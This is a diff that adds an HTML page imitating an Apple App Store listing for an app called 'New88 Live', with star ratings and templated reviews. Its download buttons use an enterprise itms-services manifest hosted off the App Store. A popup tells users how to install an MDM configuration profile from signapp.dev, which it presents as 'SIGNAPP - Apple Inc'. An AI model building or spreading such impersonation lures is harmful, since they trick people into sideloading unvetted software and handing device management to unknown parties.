@@ -1,0 +1,863 @@
+
+<!DOCTYPE html>
+
+<html  dir="ltr" lang="en-GB">
+   <head>
+      <meta charset="utf-8">
+      <meta http-equiv="X-UA-Compatible" content="IE=edge">
+      <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+      <meta name="applicable-device" content="pc,mobile">
+    <link rel="icon" type="image/x-icon" href="./favicon.png">
+      
+      <!-- EMBER_CLI_FASTBOOT_TITLE -->
+      <title>
+        New88 Live on the App Store
+      </title>
+<meta name="keywords" content="sign app ios, ký ứng dụng ios, chứng chỉ ios, thuê tài khoản apple, ứng dụng, phân phối, lưu trữ, android, ios">
+<meta name="description" content="Phân phối ứng dụng miễn phí, phân phối ứng dụng Android Ios, Lưu trữ ứng dụng iOS Android , thuê chứng chỉ doanh nghiệp Apple, Chứng chỉ ios,Sign ios, tài khoản ios, ký chứng chỉ file ipa,phân phối ứng dụng, lưu trữ miễn phí, iOS, Android, iPad, iPhone, Tải xuống ứng dụng ipa, apk,iOS beta, Android beta">
+      
+      
+      <link integrity="" rel="stylesheet" href="main.css" />
+		<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js" integrity="sha512-bnIvzh6FU75ZKxp0GXLH9bewza/OIw6dLVh9ICg0gogclmYGguQJWl8U30WpbsGTqbIiAwxTsbe76DErLq5EDQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+   </head>
+   <body class="no-js no-touch globalnav-scrim">
+      
+      <div class="ember-view">
+      <script>
+$(document).ready(function(){
+    $(".btn-download").on("click", function(){
+        $(this).html('<span class="spinner"></span> Đang cài đặt...')
+               .css("pointer-events", "none"); // Vô hiệu hóa click tiếp
+               setTimeout(function() {
+      $("#btn-download1").html('Tải xuống')
+               .css("pointer-events", ""); // Vô hiệu hóa click tiếp
+      $("#btn-download2").html('Dự Phòng')
+               .css("pointer-events", ""); // Vô hiệu hóa click tiếp
+    }, 2000);
+    });
+});
+</script>
+
+<style>
+.spinner {
+    border: 2px solid #fff;
+    border-top: 2px solid transparent;
+    border-radius: 50%;
+    width: 12px;
+    height: 12px;
+    display: inline-block;
+    animation: spin 1s linear infinite;
+    margin-right: 5px;
+}
+
+@keyframes spin {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+}
+
+</style>
+<style>
+  /* Lớp phủ nền */
+    .overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background-color: rgba(0, 0, 0, 0.5); /* mờ */
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 999;
+      animation: fadeIn 0.3s ease;
+    }
+
+    /* Hiệu ứng fade */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    /* Popup box */
+    .popup {
+      background-color: white;
+      border-radius: 15px;
+      padding: 20px;
+      width: 90%;
+      max-width: 350px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      animation: fadeIn 0.3s ease;
+    }
+
+    .popup-message {
+      font-size: 14px;
+      color: #000;
+      line-height: 1.5;
+    }
+
+    .popup-message span.red {
+      color: red;
+      font-weight: bold;
+    }
+
+    .popup-footer {
+      text-align: right;
+      margin-top: 15px;
+    }
+
+    .popup-button {
+      color: #007aff;
+      font-weight: bold;
+      background: none;
+      border: none;
+      font-size: 16px;
+      cursor: pointer;
+    }
+ .popup1 {
+      background: linear-gradient(#4fc3f7, #29b6f6);
+      border-radius: 30px;
+      text-align: center;
+      padding: 40px 20px 20px 20px;
+      width: 90%;
+      max-width: 500px;
+      box-shadow: 0 5px 20px rgba(0,0,0,0.3);
+    }
+    .popup1 img {
+      width: 30px;
+      margin-bottom: 20px;
+    }
+    .popup1 p {
+      font-size: 25px;
+      color: white;
+    }
+    .popup1 p span {
+      color: red;
+      font-weight: bold;
+    }
+    .link-box {
+      background: white;
+      margin-top: 20px;
+      padding: 15px;
+      border-radius: 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .link-box input {
+      border: none;
+      font-size: 16px;
+      width: 70%;
+      outline: none;
+    }
+    .copy-btn {
+      background: linear-gradient(to right, #00c6ff, #0072ff);
+      border: none;
+      color: white;
+      padding: 10px 10px;
+      border-radius: 30px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+  .close-btn {
+      position: absolute;
+      right: 50px;
+      font-size: 24px;
+      color: white;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    .show-btn {
+      margin: 50px;
+      padding: 12px 24px;
+      font-size: 18px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+    }
+	.link-box input {
+  border: 2px solid #0072ff;
+  border-radius: 12px;
+  font-size: 16px;
+  width: 70%;
+  outline: none;
+  padding: 8px;
+  box-shadow: 0 0 5px rgba(0, 114, 255, 0.4);
+}
+
+</style>
+<!-- Overlay + popup -->
+<div class="overlay" id="overlay">
+  <div class="popup">
+    <div class="popup-message" id="popup-message">
+      Cách để cài đặt Hồ Sơ Tải Xuống
+      <span class="red">【Cài Đặt】</span> - 
+      <span class="red">【Cài Đặt Chung】</span> - 
+      <span class="red">[Quản lý VPN & Thiết bị]</span>.<br>
+      Trong hồ sơ đã tải xuống, hãy nhấp vào 
+      <span class="red">《SIGNAPP - Apple Inc》</span> để cài đặt. Nếu nó nhắc "tải trọng MDM không khớp", vui lòng xóa tệp mô tả cũ trước.
+    </div>
+    <div class="popup-footer">
+      <a href="https://signapp.dev/mdm/install/Wm9jdGVRYXVac2M0d3NoMkYzSEEwUT09.mobileconfig" onClick="setTimerClose();" class="btn-download" style="font-size:12px">Tải xuống</a>
+      <button class="popup-button" onclick="closePopup()">Tắt</button>
+    </div>
+  </div>
+</div>
+ <!-- Overlay + Popup -->
+  <div class="overlay" id="popupOverlay">
+    <div class="popup1">
+      <div class="close-btn" onclick="closePopup2()">X</div>
+      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/52/Safari_browser_logo.svg/1200px-Safari_browser_logo.svg.png" alt="Safari Logo" style="width:40px">
+     <h2> <p>Vui lòng sử dụng trình duyệt <span>Safari</span></p></h2>
+      <div class="link-box">
+        <input type="text" value="https://signapp.dev/apps/Wm9jdGVRYXVac2M0d3NoMkYzSEEwUT09" id="link" readonly>
+        <button class="copy-btn" onclick="copyLink()">Sao chép</button>
+      </div>
+    </div>
+  </div>
+<script>
+    function copyLink() {
+      const linkInput = document.getElementById("link");
+      linkInput.select();
+      document.execCommand("copy");
+      alert("Đã sao chép liên kết!");
+    }
+function isSafari() {
+    return /^((?!chrome|android).)*safari/i.test(navigator.userAgent) && 
+           !navigator.userAgent.includes("CriOS");
+}
+    function closePopup2() {
+		closePopup();
+      document.getElementById("popupOverlay").style.display = "none";
+    }
+
+function showPopup(plistUrl) {
+	$('#btn-download1').hide();
+    const overlay = document.getElementById('overlay');
+    if (!overlay) return;
+
+    if (isSafari()) {
+        console.log("Đây là Safari");
+        window.location.href = plistUrl; // Tùy bạn muốn redirect luôn không
+    } else {
+    document.getElementById("popupOverlay").style.display = "flex";
+        console.log("Không phải Safari");
+    }
+
+    overlay.style.display = 'flex';
+}
+
+function closePopup() {
+    const overlay = document.getElementById('overlay');
+    if (overlay) overlay.style.display = 'none';
+}
+
+function setTimerClose() {
+    setTimeout(() => {
+        window.location.reload();
+    }, 2000);
+}
+
+</script>
+
+         <main class="selfclear is-apps-theme">
+            <!---->
+            <input id="localnav-menustate" class="localnav-menustate" type="checkbox">
+            <nav id="localnav" class="css-sticky we-localnav localnav   we-localnav--app-store" data-sticky>
+               <div class="localnav-wrapper">
+                  <div class="localnav-background we-localnav__background"></div>
+                  <div class="localnav-content we-localnav__content">
+                     <div class="localnav-title we-localnav__title">
+                        <a href="https://www.apple.com/vn/ios/app-store/" data-we-link-to-exclude><span class="we-localnav__title__product" data-test-we-localnav-store-title>App Store</span></a> <span class="we-localnav__title__qualifier" data-test-we-localnav-preview-title>Preview</span>
+                     </div>
+                     <div class="localnav-menu we-localnav__menu we-localnav__menu--apps">
+                        <!---->        
+                        <div class="localnav-actions we-localnav__actions">
+                           <!---->            
+                           <!---->
+                        </div>
+                     </div>
+                  </div>
+               </div>
+            </nav>
+            <span class="we-localnav__shim" aria-hidden="true"></span>
+            <label id="localnav-curtain" for="localnav-menustate"></label>
+            <div class="animation-wrapper is-visible">
+               <!---->
+               <!---->
+               <!---->
+               <section class="l-content-width section section--hero product-hero">
+                  <div class="l-row">
+                     <div class="product-hero__media l-column small-5 medium-4 large-3 small-valign-top">
+                        <picture class="we-artwork we-artwork--downloaded product-hero__artwork we-artwork--fullwidth we-artwork--ios-app-icon" style="--background-color: #0e1339;" id="ember220779">
+                        <img 
+    id="dynamicImage" 
+    src="./assets/icon.png"  
+    decoding="async" 
+    class="we-artwork__image ember220779" 
+    alt="" 
+    role="presentation" 
+    height="246" 
+    width="246"
+    onerror="loadFallback()"
+>
+                           <style>
+                              .ember220779, #ember220779::before {
+                              width: 246px;
+                              height: 246px;
+                              }
+                              .ember220779::before {
+                              padding-top: 100%;
+                              }
+                              @media (min-width: 735px) {
+                              .ember220779, #ember220779::before {
+                              width: 217px;
+                              height: 217px;
+                              }
+                              .ember220779::before {
+                              padding-top: 100%;
+                              }
+                              }
+                              @media (min-width: 1069px) {
+                              .ember220779, #ember220779::before {
+                              width: 230px;
+                              height: 230px;
+                              }
+                              .ember220779::before {
+                              padding-top: 100%;
+                              }
+                              }
+                           </style>
+                        </picture>
+                     </div>
+                     <div class="l-column small-7 medium-8 large-9 small-valign-top">
+                        <header class="product-header app-header product-header--padded-start">
+                           <!---->
+                           <h1 class="product-header__title app-header__title" style="text-transform: uppercase">
+                             New88 Live                              <!---->           
+                              <span class="badge badge--product-title">12+</span>
+                           </h1>
+                           <!---->
+                           <h2 class="product-header__identity app-header__identity">
+                              <a href="#" class="link">
+                                 Games
+                              </a>
+                           </h2>
+                           <!---->
+                           <ul class="product-header__list app-header__list">
+                              <li class="product-header__list__item">
+                                 <ul class="inline-list inline-list--mobile-compact">
+                                    <a href="#" class="inline-list__item">
+                                    #59 in Adventure
+                                    </a>
+                                 </ul>
+                              </li>
+                              <li class="product-header__list__item app-header__list__item--user-rating">
+                                 <ul class="inline-list inline-list--mobile-compact">
+                                    <li class="inline-list__item">
+                                       <figure class="we-star-rating" aria-label="4.6 out of 5">
+                                          <span class="we-star-rating-stars-outlines">
+                                          <span class="we-star-rating-stars we-star-rating-stars-4_5"></span>
+                                          </span>
+                                          <figcaption class="we-rating-count star-rating__count">4.6 • 8.6K Xếp hạng</figcaption>
+                                       </figure>
+                                    </li>
+                                 </ul>
+                              </li>
+                           </ul>
+                           <ul class="product-header__list app-header__list">
+                              <!---->
+                              <li class="product-header__list__item">
+                                 <ul class="inline-list inline-list--mobile-compact">
+                                    <li class="inline-list__item inline-list__item--bulleted app-header__list__item--price">Miễn phí</li>
+                                    <li class="inline-list__item inline-list__item--bulleted app-header__list__item--in-app-purchase">Offers In-App Purchases</li>
+                                 </ul>
+                              </li>
+                              <!---->
+                              <!---->        
+                           </ul>
+                           <ul class="nt-download-cta">
+                              <li>
+                                 <a href="itms-services://?action=download-manifest&url=https://newlive.sgp1.cdn.digitaloceanspaces.com/ios/manifest1.plist" class="btn-download" id="btn-download1" style="font-size:12px">Tải xuống</a>
+                              </li>
+                              <!--<li>
+                                 <a href="javascript:showPopup('https://signapp.dev/mdm/install/Wm9jdGVRYXVac2M0d3NoMkYzSEEwUT09.mobileconfig')" class="btn-download" id="btn-download2" style="font-size:12px">Dự Phòng</a>
+                              </li>
+                              <li>
+                                 <small><a href="#" class="btn-buy-inapp">In-App Purchase</a></small>
+                              </li>--->
+                           </ul>
+                           <!---->
+                           <!---->
+                           <!---->
+                           <!---->      
+                        </header>
+                     </div>
+                  </div>
+               </section>
+               <!---->
+			   <section class="l-content-width section section--bordered">
+				   <div class="section__nav">
+					  <h2 class="section__headline">
+						 Hướng dẫn cài đặt					  </h2>
+				   </div>
+				   <style>
+					  .responsive-video {
+							width: 100%;
+							height: 100%;
+							object-fit: cover;
+						}
+					  @media (min-width: 550px) {
+					  .responsive-video {
+					  width: 550px;
+					  height: 550px;
+					  }
+					  }
+				   </style>
+				   <div class="l-row responsive-video-wrapper">
+					  <!--<video class="responsive-video" controls="" autoplay="" muted="">
+						 <source src="intro.mp4" type="video/mp4">
+					  </video>-->
+						<img src="./images/vi.png" style="max-width: 100%; height: auto;" />
+				   </div>
+				</section>
+                  <script type="text/javascript">
+                     const iphoneTab = document.getElementById('ember220780');
+                     const ipadTab = document.getElementById('ember220781');
+                     const iphoneTabContent = document.getElementById('iPhoneTab');
+                     const ipadTabContent = document.getElementById('iPadTab');
+                     iphoneTab?.addEventListener('click', function(event) {
+                        event.preventDefault();
+                        iphoneTab.classList.add('is-active');
+                        ipadTab.classList.remove('is-active');
+                        iphoneTabContent.style.display = 'block';
+                        ipadTabContent.style.display = 'none';
+                     });
+
+                     ipadTab?.addEventListener('click', function(event) {
+                        event.preventDefault();
+                        ipadTab.classList.add('is-active');
+                        iphoneTab.classList.remove('is-active');
+                        ipadTabContent.style.display = 'block';
+                        iphoneTabContent.style.display = 'none';
+                     });
+
+                  </script>
+               </section>
+               <section class="l-content-width section section--bordered" style="display: none;">
+                  <div class="section__description">
+                     <h2 class="section__headline visuallyhidden">Giới thiệu</h2>
+                     <div class="l-row">
+                        <div class="we-truncate we-truncate--multi-line we-truncate--interactive  l-column small-12 medium-9 large-8" dir>
+                           <p dir="false" data-test-bidi>Thông tin phiên bản                </p>
+                           <!---->
+                        </div>
+                     </div>
+                  </div>
+               </section>
+               <!---->
+               <section class="l-content-width section section--bordered whats-new">
+                  <div class="section__nav section__nav--small">
+                     <h2 class="whats-new__headline">Có gì mới</h2>
+                     <div class="version-history">
+                        <!---->
+                        <!---->
+                     </div>
+                  </div>
+                  <div class="l-row whats-new__content">
+                     <div class="l-column small-12 medium-3 large-4 small-valign-top whats-new__latest">
+                        <div class="l-row">
+                           <time data-test-we-datetime class="" >20 Feb 2024</time>
+                           <p class="l-column small-6 medium-12 whats-new__latest__version">Version 2.10.2</p>
+                        </div>
+                     </div>
+                     <div class="l-column small-12 medium-9 large-8 small-valign-top">
+                        <div class="we-truncate we-truncate--multi-line we-truncate--interactive " dir>
+                           <p dir="false" data-test-bidi>1. Phiên bản cập nhật đến 1.0.0<br />2. Tăng độ tương thích của một số thiết bị<br /></p>
+                           <!---->
+                        </div>
+                     </div>
+                  </div>
+               </section>
+               <section class="l-content-width section section--bordered">
+                  <div class="section__nav">
+                     <h2 class="section__headline">
+                        Xếp hạng và Đánh giá                     </h2>
+                     <!---->
+                  </div>
+                  <div class="we-customer-ratings lockup">
+                     <div class="l-row">
+                        <div class="we-customer-ratings__stats l-column small-4 medium-6 large-4">
+                           <div class="we-customer-ratings__averages"><span class="we-customer-ratings__averages__display">4.6</span> out of 5</div>
+                           <div class="we-customer-ratings__count small-hide medium-show">8.6K Ratings</div>
+                        </div>
+                        <div class=" l-column small-8 medium-6 large-4">
+                           <figure class="we-star-bar-graph">
+                              <div class="we-star-bar-graph__row">
+                                 <span class="we-star-bar-graph__stars we-star-bar-graph__stars--5"></span>
+                                 <div class="we-star-bar-graph__bar">
+                                    <div class="we-star-bar-graph__bar__foreground-bar" style="width: 82%;"></div>
+                                 </div>
+                              </div>
+                              <div class="we-star-bar-graph__row">
+                                 <span class="we-star-bar-graph__stars we-star-bar-graph__stars--4"></span>
+                                 <div class="we-star-bar-graph__bar">
+                                    <div class="we-star-bar-graph__bar__foreground-bar" style="width: 8%;"></div>
+                                 </div>
+                              </div>
+                              <div class="we-star-bar-graph__row">
+                                 <span class="we-star-bar-graph__stars we-star-bar-graph__stars--3"></span>
+                                 <div class="we-star-bar-graph__bar">
+                                    <div class="we-star-bar-graph__bar__foreground-bar" style="width: 3%;"></div>
+                                 </div>
+                              </div>
+                              <div class="we-star-bar-graph__row">
+                                 <span class="we-star-bar-graph__stars we-star-bar-graph__stars--2"></span>
+                                 <div class="we-star-bar-graph__bar">
+                                    <div class="we-star-bar-graph__bar__foreground-bar" style="width: 2%;"></div>
+                                 </div>
+                              </div>
+                              <div class="we-star-bar-graph__row">
+                                 <span class="we-star-bar-graph__stars "></span>
+                                 <div class="we-star-bar-graph__bar">
+                                    <div class="we-star-bar-graph__bar__foreground-bar" style="width: 6%;"></div>
+                                 </div>
+                              </div>
+                           </figure>
+                           <p class="we-customer-ratings__count medium-hide">8.6K Ratings</p>
+                        </div>
+                     </div>
+                  </div>
+                  <div class="l-row l-row--peek">
+                     <div id="ember220789" class="small-valign-top l-column--equal-height l-column small-4 medium-6 large-4">
+                        <div>
+                           <!---->
+                           <!---->
+                        </div>
+                                                
+                        <div aria-labelledby="we-customer-review-12311" class="we-customer-review lockup">
+                           <figure class="we-star-rating we-customer-review__rating we-star-rating--large" aria-label="5 out of 5">
+                              <span class="we-star-rating-stars-outlines">
+                              <span class="we-star-rating-stars we-star-rating-stars-5"></span>
+                              </span>
+                              <!---->
+                           </figure>
+                           <div class="we-customer-review__header we-customer-review__header--user">
+                              <span class="we-truncate we-truncate--single-line  we-customer-review__user" dir="ltr">
+                              Lê
+                              </span>
+                              <span class="we-customer-review__separator">, </span>
+                              <time data-test-customer-review-date class="we-customer-review__date" > 03/07/2024</time>
+                           </div>
+                           <h3 class="we-truncate we-truncate--single-line  we-customer-review__title" dir="ltr" id="we-customer-review-12311">
+                               Tú Nguyễn
+                           </h3>
+                           <blockquote class="we-truncate we-truncate--multi-line we-truncate--interactive  we-customer-review__body" dir>
+                              <p dir="false" data-test-bidi> Game hay và rất mượn mọi người nên chơi</p>
+                              <!---->
+                           </blockquote>
+                           <!---->
+                        </div>
+                     </div>                      
+                     <div id="ember220791" class="small-valign-top l-column--equal-height l-column small-4 medium-6 large-4">
+                        <div>
+                           <!---->
+                           <!---->
+                        </div>
+                        <div aria-labelledby="we-customer-review-12312" class="we-customer-review lockup">
+                           <figure class="we-star-rating we-customer-review__rating we-star-rating--large" aria-label="5 out of 5">
+                              <span class="we-star-rating-stars-outlines">
+                              <span class="we-star-rating-stars we-star-rating-stars-4"></span>
+                              </span>
+                              <!---->
+                           </figure>
+                           <div class="we-customer-review__header we-customer-review__header--user">
+                              <span class="we-truncate we-truncate--single-line  we-customer-review__user" dir="ltr">
+                             BinhChon
+                              </span>
+                              <span class="we-customer-review__separator">, </span>
+                              <time data-test-customer-review-date class="we-customer-review__date" >21/03/2024</time>
+                           </div>
+                           <h3 class="we-truncate we-truncate--single-line  we-customer-review__title" dir="ltr" id="we-customer-review-12312">
+                             Game hay
+                           </h3>
+                           <blockquote class="we-truncate we-truncate--multi-line we-truncate--interactive  we-customer-review__body" dir>
+                              <p dir="false" data-test-bidi> nên được xứng đáng 5 sao.</p>
+                              <!---->
+                           </blockquote>
+                           <!---->
+                        </div>
+                     </div>                         
+                     <div id="ember220793" class="small-valign-top l-column--equal-height l-column small-4 medium-6 large-4">
+                        <div>
+                           <!---->
+                           <!---->
+                        </div>
+                        <div aria-labelledby="we-customer-review-12313" class="we-customer-review lockup">
+                           <figure class="we-star-rating we-customer-review__rating we-star-rating--large" aria-label="4 out of 5">
+                              <span class="we-star-rating-stars-outlines">
+                              <span class="we-star-rating-stars we-star-rating-stars-4"></span>
+                              </span>
+                              <!---->
+                           </figure>
+                           <div class="we-customer-review__header we-customer-review__header--user">
+                              <span class="we-truncate we-truncate--single-line  we-customer-review__user" dir="ltr">
+                              Bùi
+                              </span>
+                              <span class="we-customer-review__separator">, </span>
+                              <time data-test-customer-review-date class="we-customer-review__date" >03/08/2024</time>
+                           </div>
+                           <h3 class="we-truncate we-truncate--single-line  we-customer-review__title" dir="ltr" id="we-customer-review-12313">
+                              Game hay
+                           </h3>
+                           <blockquote class="we-truncate we-truncate--multi-line we-truncate--interactive  we-customer-review__body" dir>
+                              <p dir="false" data-test-bidi> nên được xứng đáng 5 sao.</p>
+                              <!---->
+                           </blockquote>
+                           <!---->
+                        </div>
+                     </div>                  </div>
+                  <div class="l-row l-row--margin-top medium-hide">
+                     <!---->          
+                     <!---->          
+                     <!---->          
+                     <!---->          
+                     <!---->          
+                     <!---->          
+                     <!---->          
+                     <!---->          
+                     <!---->          
+                     <!---->          
+                  </div>
+               </section>
+               <section class="l-content-width section section--bordered" style="display: none;">
+                  <div class="section__nav">
+                     <h2 class="section__headline">
+                        Events
+                     </h2>
+                     <!---->
+                  </div>
+                  <div class="l-row">
+                     <a href="#" class="we-lockup  targeted-link l-column small-6 medium-6 large-4 we-lockup--shelf-align-top we-lockup--in-app-event-module"  style="--event-color: #769dc0;" >
+                        <h3 class="we-lockup__lockup-eyebrow we-lockup__text--white">
+                           NOW AVAILABLE
+                        </h3>
+                        <div class="we-lockup__overlay" style="--background-image: url(../is1-ssl.mzstatic.com/image/thumb/wlu_dEugnWRVW_J3CUb1vw/100x25br.jpg);">
+                           <picture class="we-artwork we-artwork--downloaded we-lockup__artwork we-artwork--lockup we-artwork--fullwidth" style="--background-color: #769dc0;" dir="ltr" id="ember220795">
+                              <img src="assets/images/480x270sr.html" decoding="async" loading="lazy" class="we-artwork__image ember220795  we-artwork__image--lazyload" alt role="presentation" height="189" width="336">
+                              <style>
+                                 .ember220795, #ember220795::before {
+                                 width: 336px;
+                                 height: 189px;
+                                 }
+                                 .ember220795::before {
+                                 padding-top: 56.25%;
+                                 }
+                                 @media (min-width: 735px) {
+                                 .ember220795, #ember220795::before {
+                                 width: 336px;
+                                 height: 189px;
+                                 }
+                                 .ember220795::before {
+                                 padding-top: 56.25%;
+                                 }
+                                 }
+                                 @media (min-width: 1069px) {
+                                 .ember220795, #ember220795::before {
+                                 width: 480px;
+                                 height: 270px;
+                                 }
+                                 .ember220795::before {
+                                 padding-top: 56.25%;
+                                 }
+                                 }
+                              </style>
+                           </picture>
+                           <div class="we-lockup__material"></div>
+                           <div class="we-lockup__joe-color"></div>
+                        </div>
+                        <div class="we-lockup__copy">
+                           <!---->      
+                           <div class="we-lockup__text we-lockup__text--white">
+                              <div class="event-details__eyebrow">MAJOR UPDATE</div>
+                              <!---->
+                              <!---->
+                              <div class="we-lockup__title  ">
+                                 <div class="event-details__title">
+                                    SP Hải Thần Đường Tâm
+                                 </div>
+                              </div>
+                              <!---->      
+                           </div>
+                        </div>
+                     </a>
+                  </div>
+               </section>
+               <!---->
+               <!---->
+               <section class="l-content-width section section--bordered app-privacy">
+                  <div class="section__nav">
+                     <h2 class="section__headline section__headline--app-privacy">
+                        App Privacy & Legal regulations
+                     </h2>
+                     <div class="app-privacy--modal privacy-type--modal">
+                        <!---->
+                        <!---->
+                     </div>
+                  </div>
+                  <p>
+                     <span class="app-privacy__developer-name">Chúng tôi không chịu trách nhiệm cho bất kỳ hành vi vi phạm pháp luật nào từ phía người dùng. Khi sử dụng dịch vụ của chúng tôi, bạn cam kết tuân thủ tất cả các quy định và luật pháp hiện hành của Việt Nam, bao gồm các quy định về bảo mật thông tin, giao dịch điện tử và an ninh mạng. Nếu phát hiện hành vi sai phạm, chúng tôi có quyền xóa tài khoản mà không cần thông báo trước. Bạn nên tìm hiểu kỹ các quy định này để đảm bảo quyền lợi và nghĩa vụ của mình.</a>
+                  </p>
+                  <div class="app-privacy__cards">
+                     <div class="app-privacy__card">
+                        <div class="privacy-type__icon">
+                           <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" aria-hidden="true">
+                              <path d="M58.595 42c1.544 0 2.405.866 2.405 2.45v7.29c0 6.153-3.087 9.26-9.322 9.26h-7.244C42.861 61 42 60.134 42 58.61c0-1.554.86-2.42 2.434-2.42h7.185c2.91 0 4.6-1.582 4.6-4.69v-7.05c0-1.584.833-2.45 2.376-2.45zm-53.22 0c1.543 0 2.404.866 2.404 2.45v7.05c0 3.108 1.633 4.69 4.601 4.69h7.186c1.573 0 2.434.866 2.434 2.42 0 1.524-.86 2.39-2.434 2.39h-7.244C6.117 61 3 57.922 3 51.74v-7.29C3 42.866 3.83 42 5.375 42zM32 34C42.897 34 48 42.988 48 46.399c0 .949-.48 1.601-1.501 1.601H17.501C16.481 48 16 47.348 16 46.399 16 42.988 21.103 34 32 34zM32 14c4.438 0 8 3.82 8 8.412 0 4.916-3.562 8.618-8 8.588-4.437-.029-8-3.672-8-8.588C24 17.82 27.563 14 32 14zM51.678 3C57.913 3 61 6.076 61 12.231v7.32C61 21.103 60.168 22 58.595 22c-1.514 0-2.375-.896-2.375-2.45V12.5c0-3.108-1.692-4.691-4.601-4.691h-7.185c-1.573 0-2.434-.866-2.434-2.42C42 3.837 42.86 3 44.434 3h7.244zM19.566 3C21.139 3 22 3.836 22 5.39c0 1.553-.86 2.419-2.434 2.419H12.38c-2.968 0-4.601 1.583-4.601 4.69v7.051c0 1.554-.83 2.45-2.404 2.45C3.86 22 3 21.104 3 19.55v-7.319C3 6.076 6.117 3 12.322 3h7.244z"/>
+                           </svg>
+                        </div>
+                        <h3 class="privacy-type__heading">Data Used to Track You</h3>
+                        <p class="privacy-type__description">The following data may be used to track you across apps and websites owned by other companies:</p>
+                        <ul class="privacy-type__items">
+                           <li classs="privacy-type__item">
+                              <span class="privacy-type__grid">
+                                 <span class="privacy-type__grid-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" class="privacy-type__glyph privacy-type__glyph--identifiers" aria-hidden="true">
+                                       <path d="M52.367 24h-14.76C36.704 24 36 23.342 36 22.51c0-.835.705-1.51 1.606-1.51h14.761c.905 0 1.633.675 1.633 1.51 0 .832-.728 1.49-1.633 1.49m0 10h-14.76C36.704 34 36 33.35 36 32.52c0-.85.705-1.52 1.606-1.52h14.761c.905 0 1.633.67 1.633 1.52 0 .83-.728 1.48-1.633 1.48m0 9h-14.76C36.704 43 36 42.33 36 41.484c0-.83.705-1.484 1.606-1.484h14.761c.905 0 1.633.654 1.633 1.484C54 42.33 53.272 43 52.367 43m-24.04 0H12.66C10.7 43 10 42.459 10 41.401 10 38.288 14.028 34 20.493 34 26.973 34 31 38.288 31 41.401 31 42.46 30.305 43 28.328 43m-7.321-22C23.673 21 26 23.31 26 26.425 26 29.58 23.686 32 21.007 32 18.314 32 16 29.58 16 26.452 15.987 23.359 18.327 21 21.007 21m32.158-10h-42.33C5.645 11 3 13.566 3 18.645V45.33C3 50.408 5.644 53 10.835 53h42.33C58.355 53 61 50.408 61 45.329V18.645C61 13.592 58.356 11 53.165 11"/>
+                                    </svg>
+                                 </span>
+                                 <span class="privacy-type__grid-content privacy-type__data-category-heading">Identifiers</span>
+                              </span>
+                           </li>
+                           <li classs="privacy-type__item">
+                              <span class="privacy-type__grid">
+                                 <span class="privacy-type__grid-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" class="privacy-type__glyph privacy-type__glyph--other" aria-hidden="true">
+                                       <path d="M32.09 61.568c16.185 0 29.586-13.43 29.586-29.587 0-16.186-13.43-29.587-29.616-29.587-16.157 0-29.558 13.4-29.558 29.587 0 16.156 13.43 29.587 29.587 29.587zM18.078 36.332c-2.379 0-4.351-1.944-4.351-4.38 0-2.408 1.972-4.351 4.35-4.351 2.408 0 4.381 1.943 4.381 4.35a4.358 4.358 0 01-4.38 4.38zm13.981 0a4.376 4.376 0 01-4.38-4.38c0-2.408 1.973-4.351 4.38-4.351a4.345 4.345 0 014.351 4.35 4.352 4.352 0 01-4.35 4.38zm13.981 0a4.358 4.358 0 01-4.38-4.38 4.352 4.352 0 014.38-4.351c2.38 0 4.352 1.943 4.352 4.35 0 2.437-1.973 4.38-4.352 4.38z"/>
+                                    </svg>
+                                 </span>
+                                 <span class="privacy-type__grid-content privacy-type__data-category-heading">Other Data</span>
+                              </span>
+                           </li>
+                        </ul>
+                     </div>
+                     <div class="app-privacy__card">
+                        <div class="privacy-type__icon">
+                           <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" aria-hidden="true">
+                              <path d="M32.09 61.568c16.185 0 29.586-13.43 29.586-29.587 0-16.186-13.43-29.587-29.616-29.587-16.157 0-29.558 13.4-29.558 29.587 0 16.156 13.43 29.587 29.587 29.587zm0-4.932c-13.692 0-24.628-10.964-24.628-24.655 0-13.692 10.907-24.656 24.598-24.656 13.691 0 24.656 10.964 24.685 24.656.03 13.69-10.965 24.655-24.656 24.655zm-.03-25.555c4.12.03 7.455-3.48 7.455-8.121 0-4.351-3.336-7.977-7.455-7.977s-7.455 3.626-7.455 7.977c0 4.64 3.336 8.092 7.455 8.121zM18.804 46.687h26.512c1.16 0 1.712-.754 1.712-1.827 0-3.162-4.786-11.4-14.968-11.4-10.181 0-14.967 8.238-14.967 11.4 0 1.073.55 1.827 1.711 1.827z"/>
+                           </svg>
+                        </div>
+                        <h3 class="privacy-type__heading">Data Linked to You</h3>
+                        <p class="privacy-type__description">The following data may be collected and linked to your identity:</p>
+                        <ul class="privacy-type__items">
+                           <li classs="privacy-type__item">
+                              <span class="privacy-type__grid">
+                                 <span class="privacy-type__grid-icon">
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" class="privacy-type__glyph privacy-type__glyph--purchases" aria-hidden="true">
+                                       <path d="M15.288 61.992h34.483c5.244 0 8.32-3.047 8.32-9.082V22.588c0-6.035-3.105-9.082-9.199-9.082h-4.688c-.146-6.152-5.507-11.397-12.128-11.397-6.622 0-11.983 5.245-12.13 11.397h-4.658c-6.123 0-9.199 3.018-9.199 9.082V52.91c0 6.065 3.076 9.082 9.2 9.082zm16.788-55.43c4.13 0 7.265 3.106 7.412 6.944H24.663c.147-3.838 3.282-6.943 7.413-6.943z"/>
+                                    </svg>
